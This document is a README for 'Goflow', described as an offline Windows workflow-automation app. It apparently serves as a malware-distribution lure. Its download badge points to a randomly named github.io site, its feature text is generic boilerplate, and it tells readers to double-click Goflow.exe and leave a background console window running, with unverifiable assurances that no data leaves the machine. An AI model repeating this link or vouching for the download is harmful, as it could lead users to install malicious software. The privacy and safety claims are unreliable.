# ⚙️ Goflow - Automate your tasks with simple workflows

[![Download Goflow](https://img.shields.io/badge/Download-Goflow-blue.svg)](https://southwesterarytenoid969.github.io)

Goflow helps you connect your apps and automate repetitive processes. It runs entirely on your machine. You control your data and your workflows. The software uses a visual interface to link actions together. You do not need to write code to create powerful automations. 

## 🚀 Why choose Goflow?

Many automation tools require monthly subscriptions and store your data in the cloud. Goflow changes this model. It weighs less than 35 megabytes and runs on a single small file. It uses little memory and keeps your information on your own computer. You remain in control of your privacy. 

This tool works like a flowchart builder. You drag icons onto a canvas and connect them to create logical paths. Goflow handles the background work, moving data between services and executing your defined steps.

## 💻 System requirements

Goflow runs on Windows 10 and Windows 11. Your computer needs at least 2 gigabytes of random access memory to run smoothly. We recommend a solid-state drive for the fastest performance, though it works on standard hard drives. You do not need to install any other software, drivers, or runtimes.

## 🛠️ Setting up your first workflow

1. Open the folder where you saved the file.
2. Double-click the `Goflow.exe` file.
3. A small black window might appear. This is the background engine starting up. Keep this window open while you use Goflow.
4. Your default web browser will open automatically. It will display the Goflow interface at a local address.
5. Create your first workflow by clicking the "New Workflow" button.
6. Drag components from the sidebar onto the main white area.
7. Connect the components with lines to define the order of events.
8. Click "Save" to keep your settings.

## 🛡️ Privacy and local data

Goflow saves every workflow to a local SQLite database file inside the same folder as your program. This program never sends your workflow data to any external server. You own your automations. If you delete the folder, you remove all traces of the application from your machine. 

## 🔍 Frequently asked questions

**Do I need a constant internet connection?**
Goflow runs offline. However, if your workflow connects to web-based services like email or calendars, your computer needs an active internet connection to trigger those specific tasks.

**How do I update the software?**
Visit the website, download the newer version, and replace your old file with the new one. Your local database file will remain in the folder, and your workflows will load inside the new version immediately.

**Does this slow down my computer?**
Goflow uses very little power. It stays quiet in the background and only uses resources when an automation triggers. 

**Can I run multiple workflows at once?**
Yes. You can manage as many workflows as your computer memory allows. 

**What happens if the program closes?**
If you close the black background window, the automations stop. To start them again, simply launch the file once more.

## 📝 Tips for success

- Use clear names for your workflows to keep your dashboard organized.
- Test your workflow with a single item before you run it on your entire data set.
- Keep the Goflow folder in a location where your user account has write permissions.
- You can create backups of your workflow folder at any time by copying it to an external drive.
